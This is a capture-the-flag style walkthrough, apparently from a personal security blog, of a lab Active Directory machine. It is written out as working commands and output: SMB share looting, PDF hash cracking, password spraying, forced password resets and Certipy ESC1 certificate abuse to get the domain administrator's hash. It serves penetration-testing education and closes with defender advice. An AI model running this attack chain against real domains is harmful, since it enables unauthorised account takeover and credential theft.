<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Welcome | Zerotrace Logs</title>
  <meta name="description" content="Complete walkthrough of Welcome machine from HackSmarter Labs. Learn ADCS ESC1 certificate exploitation, BloodHound attack path analysis, PDF cracking, and password spraying techniques." />

  <!-- Essential Open Graph tags for LinkedIn -->
  <meta property="og:title" content="Welcome | Zerotrace Logs" />
  <meta property="og:description" content="Complete walkthrough covering Active Directory Certificate Services ESC1 exploitation, BloodHound analysis, PDF password cracking, and privilege escalation to Domain Admin." />
  <meta property="og:image" content="https://z3rotrace.live/assets/welcome/bloodhound-esc1-enrollment.png" />
  <meta property="og:url" content="https://z3rotrace.live/HackSmarter/welcome.html" />
  <meta property="og:type" content="article" />

  <!-- Twitter Card tags -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Welcome | Zerotrace Logs" />
  <meta name="twitter:description" content="Complete walkthrough covering Active Directory Certificate Services ESC1 exploitation, BloodHound analysis, PDF password cracking, and privilege escalation to Domain Admin." />
  <meta name="twitter:image" content="https://z3rotrace.live/assets/welcome/bloodhound-esc1-enrollment.png" />

  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
  <link rel="apple-touch-icon" href="../assets/favicon.png" />
  <link rel="stylesheet" href="../style.css?v=4"/>
  <style>
    /* Machine info box styling */
    .machine-info {
      background: rgba(0, 170, 255, 0.05);
      border: 1px solid rgba(0, 170, 255, 0.25);
      border-left: 4px solid #c77dff;
      border-radius: 8px;
      padding: 1rem 1.25rem;
      margin: 1.5rem 0;
    }

    .machine-info ul {
      margin: 0;
      padding-left: 0;
    }

    .machine-info li {
      margin-bottom: 0.25rem;
    }

    .machine-info li::before {
      color: #00aaff;
    }

    /* Attack chain summary box */
    .attack-chain {
      background: rgba(199, 125, 255, 0.05);
      border: 1px solid rgba(199, 125, 255, 0.25);
      border-left: 4px solid #c77dff;
      border-radius: 8px;
      padding: 1rem 1.25rem;
      margin: 1.5rem 0;
    }

    .attack-chain pre {
      background: transparent;
      border: none;
      box-shadow: none;
      padding: 0;
      margin: 0;
      font-size: 0.85rem;
      line-height: 1.8;
    }

    .attack-chain pre code {
      color: #c9d1d9;
    }

    /* Tool list styling */
    .tools-list {
      display: flex;
      flex-wrap: wrap;
      gap: 0.5rem;
      margin: 1rem 0;
      padding: 0;
    }

    .tools-list li {
      background: rgba(0, 170, 255, 0.08);
      border: 1px solid rgba(0, 170, 255, 0.2);
      border-radius: 6px;
      padding: 0.4rem 0.8rem;
      font-size: 0.9rem;
      margin: 0;
    }

    .tools-list li::before {
      content: none;
    }

    /* Key finding callout */
    .key-finding {
      background: rgba(255, 107, 107, 0.08);
      border-left: 4px solid #ff6b6b;
      padding: 0.75rem 1rem;
      margin: 1rem 0;
      border-radius: 0 6px 6px 0;
    }

    .key-finding strong {
      color: #ff6b6b;
    }

    /* Proof table styling */
    .proof-table {
      width: 100%;
      border-collapse: collapse;
      margin: 1rem 0;
      background: rgba(0, 170, 255, 0.03);
      border-radius: 8px;
      overflow: hidden;
    }

    .proof-table th,
    .proof-table td {
      padding: 0.75rem 1rem;
      text-align: left;
      border-bottom: 1px solid rgba(0, 170, 255, 0.15);
    }

    .proof-table th {
      background: rgba(0, 170, 255, 0.08);
      color: #00aaff;
      font-weight: 600;
    }

    .proof-table td code {
      font-size: 0.85rem;
    }
  </style>
</head>
<body>
<header>
  <h1 class="terminal-title" aria-label="Zerotrace Logs">
    <span class="prompt" aria-hidden="true">$</span>
    <span class="typed" id="term-typing" aria-hidden="true"></span>
    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
    <span class="sr-only">Zerotrace Logs</span>
  </h1>
</header>

<!-- Side hamburger control -->
<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
  <span class="sr-only">Toggle navigation</span>
  <span class="hamburger-icon" aria-hidden="true"></span>
</button>

<!-- Sidebar navigation -->
<aside class="sidebar" id="sidebar" aria-label="Main navigation">
  <div class="sidebar-header">
    <h3>Navigate</h3>
    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">x</span></button>
  </div>
  <div class="sidebar-content">
    <ul class="sidebar-nav">
      <li><a href="../index.html">Home</a></li>
      <li class="has-submenu">
        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Writeups</button>
        <ul class="submenu" hidden>
          <li><a href="../writeups/ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
          <li><a href="../writeups/sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
        </ul>
      </li>
      <li class="has-submenu">
        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>HackSmarter Labs</button>
        <ul class="submenu">
          <li><a href="welcome.html" aria-current="page">Welcome</a></li>
          <li><a href="staged.html">Staged</a></li>
          <li><a href="buildingmagic.html">BuildingMagic</a></li>
          <li><a href="arasaka.html">Arasaka</a></li>
          <li><a href="midgarden2-badsuccessor.html">Midgarden2</a></li>
          <li><a href="banksmarter.html">BankSmarter</a></li>
          <li><a href="ascension.html">Ascension</a></li>
          <li><a href="slayer.html">Slayer</a></li>
          <li><a href="anomaly.html">Anomaly</a></li>
          <li><a href="sharethepain.html">ShareThePain</a></li>
          <li><a href="sysco.html">Sysco</a></li>
        </ul>
      </li>
      <li><a href="../vector3.html">Certification Journey</a></li>
      <li class="has-submenu">
        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Projects</button>
        <ul class="submenu" hidden>
          <li><a href="../projects/dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
        </ul>
      </li>
    </ul>
  </div>
</aside>
<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>

<section>
  <h2>Welcome</h2>
  <p><em>Published: January 2026 | HackSmarter Labs</em></p>

  <div class="machine-info">
    <ul>
      <li><strong>Platform:</strong> HackSmarter Labs</li>
      <li><strong>Difficulty:</strong> Medium</li>
      <li><strong>OS:</strong> Windows Server 2022</li>
      <li><strong>Key Topics:</strong> Active Directory, BloodHound, ADCS ESC1, Password Spraying, PDF Cracking</li>
    </ul>
  </div>

  <h3>Overview</h3>
  <p>This machine involves compromising a Windows Active Directory environment through a chain of attacks: credential validation, SMB share enumeration, PDF password cracking, password spraying, and ultimately exploiting an ESC1 vulnerable certificate template to obtain Domain Admin privileges.</p>

  <h2>Reconnaissance</h2>

  <h3><span class="step">[Step 1]</span> Validating Initial Credentials</h3>
  <p>I started by validating the provided credentials against LDAP:</p>
  <pre><code>$ nxc ldap 10.1.159.7 -u e.hills -p 'Il0vemyj0b2025!'</code></pre>

  <pre><code>LDAP        10.1.159.7      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:WELCOME.local) (signing:None) (channel binding:Never)
LDAP        10.1.159.7      389    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!</code></pre>

  <p>The credentials are valid. Next, I generated a hosts file for easier targeting:</p>
  <pre><code>$ nxc smb 10.1.159.7 -u e.hills -p 'Il0vemyj0b2025!' --generate-hosts-file host_file</code></pre>

  <pre><code>SMB         10.1.159.7      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.159.7      445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!</code></pre>

  <p>Contents of the generated hosts file:</p>
  <pre><code>10.1.159.7     DC01.WELCOME.local WELCOME.local DC01</code></pre>

  <h3><span class="step">[Step 2]</span> BloodHound Collection</h3>
  <p>I collected domain data for BloodHound analysis:</p>
  <pre><code>$ nxc ldap 10.1.159.7 -u e.hills -p 'Il0vemyj0b2025!' --bloodhound --collection All --dns-server 10.1.159.7</code></pre>

  <pre><code>LDAP        10.1.159.7      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:WELCOME.local) (signing:None) (channel binding:Never)
LDAP        10.1.159.7      389    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!
LDAP        10.1.159.7      389    DC01             Resolved collection methods: rdp, acl, objectprops, dcom, localadmin, session, adcs, group, psremote, container, trusts
LDAP        10.1.159.7      389    DC01             Done in 0M 27S
LDAP        10.1.159.7      389    DC01             Collecting ADCS data (CertiHound)...
LDAP        10.1.159.7      389    DC01             Found 34 certificate templates
LDAP        10.1.159.7      389    DC01             Found 1 Enterprise CA
LDAP        10.1.159.7      389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.1.159.7_2026-01-04_082945_bloodhound.zip</code></pre>

  <div class="question">
    <strong>What is BloodHound?</strong>
  </div>
  <div class="answer">
    BloodHound is an Active Directory reconnaissance tool that maps relationships between AD objects (users, groups, computers) and identifies attack paths to high-value targets like Domain Admins. It collects data via LDAP queries and visualizes privilege escalation routes.
  </div>

  <h2>Attack Path Analysis</h2>

  <p>After importing the data into BloodHound, I identified a clear attack path to Domain Admin.</p>

  <h3><span class="step">[Step 3]</span> ESC1 Vulnerability on Welcome-Template</h3>
  <p>BloodHound revealed that <code>SVC_CA</code> has enrollment rights on the <code>Welcome-Template</code> certificate template, which is vulnerable to ESC1.</p>

  <p><img src="../assets/welcome/bloodhound-esc1-enrollment.png" alt="BloodHound showing SVC_CA has enrollment rights on ESC1 vulnerable certificate template" loading="lazy"></p>

  <div class="question">
    <strong>What is ESC1?</strong>
  </div>
  <div class="answer">
    ESC1 (Escalation Scenario 1) is an ADCS misconfiguration where a certificate template allows a low-privileged user to request a certificate for any other user (including Domain Admins) by specifying an arbitrary Subject Alternative Name (SAN). This happens when the template has "Supply in Request" enabled for the SAN field and also allows client authentication.
  </div>

  <h3><span class="step">[Step 4]</span> Pathway to SVC_CA</h3>
  <p>Examining the inbound object controls on <code>SVC_CA</code>, I discovered that <code>I.PARK</code> has the <code>ForceChangePassword</code> privilege over this account.</p>

  <p><img src="../assets/welcome/bloodhound-forcechangepassword.png" alt="BloodHound showing I.PARK can force change password on SVC_CA" loading="lazy"></p>

  <div class="question">
    <strong>What is ForceChangePassword?</strong>
  </div>
  <div class="answer">
    ForceChangePassword is an AD permission that allows the holder to reset another user's password without knowing the current password. Unlike a standard password reset, this does not require admin privileges on the domain controller.
  </div>

  <div class="key-finding">
    <strong>Conclusion:</strong> The high-value target is <code>I.PARK</code>. Compromising this account will allow me to take over <code>SVC_CA</code> and exploit the ESC1 vulnerability.
  </div>

  <h2>Exploitation</h2>

  <h3><span class="step">[Step 5]</span> SMB Share Enumeration</h3>
  <p>I enumerated accessible SMB shares with the <code>e.hills</code> account:</p>
  <pre><code>$ nxc smb 10.1.159.7 -u e.hills -p 'Il0vemyj0b2025!' --shares</code></pre>

  <pre><code>SMB         10.1.159.7      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.159.7      445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!
SMB         10.1.159.7      445    DC01             [*] Enumerated shares
SMB         10.1.159.7      445    DC01             Share           Permissions     Remark
SMB         10.1.159.7      445    DC01             -----           -----------     ------
SMB         10.1.159.7      445    DC01             ADMIN$                          Remote Admin
SMB         10.1.159.7      445    DC01             C$                              Default share
SMB         10.1.159.7      445    DC01             Human Resources READ
SMB         10.1.159.7      445    DC01             IPC$            READ            Remote IPC
SMB         10.1.159.7      445    DC01             NETLOGON        READ            Logon server share
SMB         10.1.159.7      445    DC01             SYSVOL          READ            Logon server share</code></pre>

  <p>The <code>Human Resources</code> share looks interesting. I connected and downloaded all files:</p>
  <pre><code>$ smbclient "//10.1.159.7/Human Resources" -U 'e.hills%[REDACTED]'</code></pre>

  <pre><code>smb: \> dir
  .                                   D        0  Sat Sep 13 19:20:17 2025
  ..                                  D        0  Sat Sep 13 16:11:19 2025
  Welcome 2025 Holiday Schedule.pdf      A    84715  Sat Sep 13 18:18:12 2025
  Welcome Benefits.pdf                A    81466  Sat Sep 13 18:18:12 2025
  Welcome Handbook Excerpts.pdf       A    82644  Sat Sep 13 18:18:12 2025
  Welcome Performance Review Guide.pdf      A    79823  Sat Sep 13 18:18:12 2025
  Welcome Start Guide.pdf             A    89511  Sat Sep 13 18:18:12 2025</code></pre>

  <pre><code>smb: \> prompt OFF
smb: \> mget *</code></pre>

  <h3><span class="step">[Step 6]</span> Cracking the Password-Protected PDF</h3>
  <p>I noticed one of the PDFs was password-protected:</p>
  <pre><code>$ qpdf --show-encryption "Welcome Start Guide.pdf"</code></pre>

  <pre><code>Incorrect password supplied
R = 4
P = -1060
User password =
extract for accessibility: allowed
extract for any purpose: allowed
print low resolution: allowed
print high resolution: allowed
modify document assembly: not allowed
modify forms: allowed
modify annotations: not allowed
modify other: allowed
modify anything: not allowed
stream encryption method: AESv2
string encryption method: AESv2
file encryption method: AESv2</code></pre>

  <p>I extracted the hash and cracked it with John the Ripper:</p>
  <pre><code>$ pdf2john "Welcome Start Guide.pdf" > pdf_hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash</code></pre>

  <pre><code>Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]   (Welcome Start Guide.pdf)
1g 0:00:00:03 DONE (2026-01-04 09:16) 0.2604g/s 241800p/s 241800c/s 241800C/s humphrey06..huitar
Session completed.</code></pre>

  <div class="key-finding">
    <strong>Cracked password:</strong> <code>[REDACTED]</code>
  </div>

  <h3><span class="step">[Step 7]</span> Extracting Credentials from the PDF</h3>
  <p>Opening the PDF with the cracked password revealed an HR onboarding document containing a default password for new employees:</p>

  <p><img src="../assets/welcome/pdf-default-password.png" alt="Welcome Start Guide PDF showing default password" loading="lazy"></p>

  <p>The document reveals:</p>
  <ul>
    <li>Temporary/default password: <code>[REDACTED]</code></li>
    <li>New employees should change this password on first login</li>
  </ul>

  <h3><span class="step">[Step 8]</span> Password Spraying</h3>

  <div class="question">
    <strong>What is Password Spraying?</strong>
  </div>
  <div class="answer">
    Password spraying is an attack technique where a single password (or small set of passwords) is tried against many user accounts. Unlike brute-forcing one account with many passwords, this approach avoids account lockouts while still testing common or leaked credentials across an organization.
  </div>

  <p>I created a list of domain users and sprayed the default password across the network:</p>
  <pre><code>$ nxc smb 10.1.159.7 -u users_spray -p '[REDACTED]'</code></pre>

  <p><img src="../assets/welcome/password-spray-results.png" alt="Password spray results showing a.harris with valid credentials" loading="lazy"></p>

  <div class="key-finding">
    <strong>Valid credentials found:</strong> <code>a.harris:[REDACTED]</code>
  </div>

  <h3><span class="step">[Step 9]</span> Exploiting Group Permissions</h3>
  <p>While <code>a.harris</code> was not the user I was hoping for (I wanted <code>i.park</code>), BloodHound showed that <code>a.harris</code> is a member of the <code>HR</code> group, which has <code>GenericAll</code> privileges over <code>i.park</code>:</p>

  <p><img src="../assets/welcome/bloodhound-genericall.png" alt="BloodHound showing HR group has GenericAll over i.park" loading="lazy"></p>

  <div class="question">
    <strong>What is GenericAll?</strong>
  </div>
  <div class="answer">
    GenericAll is an AD permission that grants full control over an object. When applied to a user account, it allows the holder to reset the target's password, modify group memberships, and perform other privileged operations without knowing the current password.
  </div>

  <h3><span class="step">[Step 10]</span> Password Chain Attack</h3>
  <p><strong>Step 1:</strong> Using <code>a.harris</code> to change <code>i.park</code>'s password:</p>
  <pre><code>$ net rpc password "i.park" 'Zerotrace123!' -U "WELCOME.local/a.harris%[REDACTED]" -S "DC01.WELCOME.local"
$ nxc smb 10.1.159.7 -u i.park -p 'Zerotrace123!'</code></pre>

  <pre><code>SMB         10.1.159.7      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.159.7      445    DC01             [+] WELCOME.local\i.park:[REDACTED]</code></pre>

  <p><strong>Step 2:</strong> Using <code>i.park</code> to change <code>SVC_CA</code>'s password:</p>
  <pre><code>$ net rpc password "SVC_CA" 'Zerotrace123!' -U "WELCOME.local/i.park%[REDACTED]" -S "DC01.WELCOME.local"
$ nxc smb 10.1.159.7 -u SVC_CA -p 'Zerotrace123!'</code></pre>

  <pre><code>SMB         10.1.159.7      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.159.7      445    DC01             [+] WELCOME.local\SVC_CA:[REDACTED]</code></pre>

  <h2>Privilege Escalation - ESC1 Certificate Attack</h2>

  <h3><span class="step">[Step 11]</span> Requesting Administrator Certificate</h3>
  <p>With control of <code>SVC_CA</code>, I exploited the ESC1 vulnerability to request a certificate as the Domain Administrator:</p>
  <pre><code>$ certipy req -u 'SVC_CA@WELCOME.local' -p '[REDACTED]' -dc-ip 10.1.159.7 -target 'DC01.WELCOME.local' -ca 'WELCOME-CA' -template 'Welcome-Template' -upn 'administrator@WELCOME.local' -debug</code></pre>

  <pre><code>Certipy v5.0.3 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '10.1.159.7'
[+] DC IP: '10.1.159.7'
[+] DC Host: 'WELCOME.LOCAL'
[+] Target IP: None
[+] Remote Name: 'DC01.WELCOME.local'
[+] Domain: 'WELCOME.LOCAL'
[+] Username: 'SVC_CA'
[+] Trying to resolve 'DC01.WELCOME.local' at '10.1.159.7'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.1.159.7[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.1.159.7[\pipe\cert]
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@WELCOME.local'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'</code></pre>

  <div class="question">
    <strong>What is Certipy?</strong>
  </div>
  <div class="answer">
    Certipy is a Python tool for enumerating and exploiting Active Directory Certificate Services (AD CS). It can identify vulnerable certificate templates, request certificates, and use them for authentication via PKINIT.
  </div>

  <h3><span class="step">[Step 12]</span> Authenticating with the Certificate</h3>
  <p>Using the obtained certificate to authenticate and retrieve the Administrator's NT hash:</p>
  <pre><code>$ certipy auth -pfx administrator.pfx -dc-ip 10.1.159.7</code></pre>

  <pre><code>Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@WELCOME.local'
[*] Using principal: 'administrator@welcome.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@welcome.local': [REDACTED]:[REDACTED]</code></pre>

  <div class="question">
    <strong>What is PKINIT?</strong>
  </div>
  <div class="answer">
    PKINIT (Public Key Cryptography for Initial Authentication) is a Kerberos extension that allows authentication using X.509 certificates instead of passwords. When exploiting ADCS vulnerabilities, attackers use PKINIT to obtain a TGT with a forged certificate, then extract the user's NT hash via a technique called UnPAC-the-hash.
  </div>

  <h2>Proof</h2>

  <table class="proof-table">
    <tr>
      <th>Flag</th>
      <th>Hash</th>
    </tr>
    <tr>
      <td><strong>Administrator NT Hash</strong></td>
      <td><code>[REDACTED]</code></td>
    </tr>
  </table>

  <h2>Tools Used</h2>

  <ul class="tools-list">
    <li><strong>NetExec (nxc)</strong> - SMB/LDAP enumeration and authentication testing</li>
    <li><strong>BloodHound</strong> - AD attack path analysis</li>
    <li><strong>smbclient</strong> - SMB share access</li>
    <li><strong>qpdf</strong> - PDF encryption analysis</li>
    <li><strong>pdf2john / John the Ripper</strong> - PDF password cracking</li>
    <li><strong>Certipy</strong> - ADCS exploitation</li>
  </ul>

  <h2>Attack Chain Summary</h2>

  <div class="attack-chain">
    <pre><code>e.hills (initial access)
    |
    v
SMB Share "Human Resources" --> Password-protected PDF
    |
    v
PDF Cracking --> Default password "[REDACTED]"
    |
    v
Password Spray --> a.harris compromised
    |
    v
GenericAll (HR Group) --> i.park password reset
    |
    v
ForceChangePassword --> SVC_CA password reset
    |
    v
ESC1 Certificate Template --> Administrator certificate
    |
    v
PKINIT Authentication --> Administrator NT hash</code></pre>
  </div>

  <h2>Lessons Learned</h2>

  <h3><span class="step defender">For Defenders</span></h3>
  <ul>
    <li><strong>Audit certificate templates:</strong> ESC1 vulnerabilities arise from misconfigured templates allowing arbitrary SANs. Disable "Supply in Request" for the SAN field unless absolutely necessary.</li>
    <li><strong>Review AD permissions:</strong> GenericAll and ForceChangePassword rights should be tightly controlled and regularly audited using BloodHound.</li>
    <li><strong>Enforce password policies:</strong> Default passwords should be randomized per-user. Never use the same temporary password for all new employees.</li>
    <li><strong>Protect sensitive documents:</strong> HR documents on file shares should not contain plaintext passwords. Consider secure onboarding portals instead.</li>
  </ul>

  <h3><span class="step redteam">For Pentesters</span></h3>
  <ul>
    <li>Always enumerate SMB shares for sensitive documents early in engagements</li>
    <li>PDF password cracking with common wordlists often yields quick wins</li>
    <li>BloodHound ADCS collection reveals certificate-based attack paths that traditional enumeration misses</li>
    <li>Chaining low-privilege permissions (GenericAll -> ForceChangePassword -> ESC1) can lead to full domain compromise</li>
  </ul>

  <p><em>Walkthrough by Zerotrace | HackSmarter Labs</em></p>

</section>

<footer>
  <div class="social-links" aria-label="Social media">
    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
      </svg>
    </a>
    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
      </svg>
    </a>
    <a href="https://www.linkedin.com/in/panagiotis-lampousis-2a100b392/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
      </svg>
    </a>
  </div>
  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
</footer>
<script src="../script.js"></script>
</body>
</html>
